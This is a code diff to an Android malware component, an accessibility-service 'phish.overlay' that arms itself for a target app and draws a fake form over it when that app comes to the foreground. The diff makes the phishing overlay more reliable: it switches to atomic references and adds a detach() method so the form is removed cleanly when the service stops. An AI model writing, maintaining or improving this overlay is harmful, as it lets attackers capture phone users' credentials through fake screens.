@@ -12,6 +12,7 @@ import android.widget.Button
 import android.widget.EditText
 import android.widget.LinearLayout
 import android.widget.TextView
+import java.util.concurrent.atomic.AtomicReference
 
 /**
  * The false screen of the phone.
@@ -50,11 +51,19 @@ object Overlay {
     /** The overlay that is armed, if there is one. */
     @Volatile private var target: Target? = null
 
-    /** The view that is on the screen, if there is one. */
-    @Volatile private var view: View? = null
+    /**
+     * The view that is on the screen, if there is one.
+     *
+     * Held the same way `Ui` holds the service: the form is drawn by a
+     * singleton, and a singleton that keeps a view is a singleton that keeps
+     * whatever the view points at.  The reference is taken and cleared
+     * atomically, and [detach] clears it when the accessibility service goes
+     * away, so nothing survives its owner.
+     */
+    private val view = AtomicReference<View?>(null)
 
     /** The window the view belongs to. */
-    @Volatile private var window: WindowManager? = null
+    private val window = AtomicReference<WindowManager?>(null)
 
     /** The package that is on the screen right now. */
     @Volatile private var foreground: String = ""
@@ -114,7 +123,7 @@ object Overlay {
             "phish.overlay: no overlay is armed\n"
         } else {
             "phish.overlay: the overlay waits for '${armed.packageName}'\n" +
-                "phish.overlay: it is ${if (view == null) "not on the screen" else "on the screen"}\n" +
+                "phish.overlay: it is ${if (view.get() == null) "not on the screen" else "on the screen"}\n" +
                 "phish.overlay: the last application on the screen was '$foreground'\n"
         }
     }
@@ -137,7 +146,7 @@ object Overlay {
             remove()
             return
         }
-        if (view != null) return
+        if (view.get() != null) return
         show(context, armed)
     }
 
@@ -206,8 +215,8 @@ object Overlay {
                 )
                 params.gravity = Gravity.TOP or Gravity.START
                 manager.addView(root, params)
-                window = manager
-                view = root
+                window.set(manager)
+                view.set(root)
             } catch (t: Throwable) {
                 remove()
             }
@@ -237,12 +246,23 @@ object Overlay {
         remove()
     }
 
+    /**
+     * The accessibility service is gone.
+     *
+     * Android calls this from `onDestroy`, and there is no other moment at
+     * which the form may outlive the service that drew it: a form left on the
+     * screen of a phone whose accessibility service the user switched off is
+     * a window nobody can take down and a reference to a dead service held
+     * for the rest of the process's life.
+     */
+    fun detach() {
+        remove()
+    }
+
     /** Take the form off the screen. */
     private fun remove() {
-        val manager = window
-        val current = view
-        view = null
-        window = null
+        val manager = window.getAndSet(null)
+        val current = view.getAndSet(null)
         if (manager == null || current == null) return
         Handler(Looper.getMainLooper()).post {
             try {
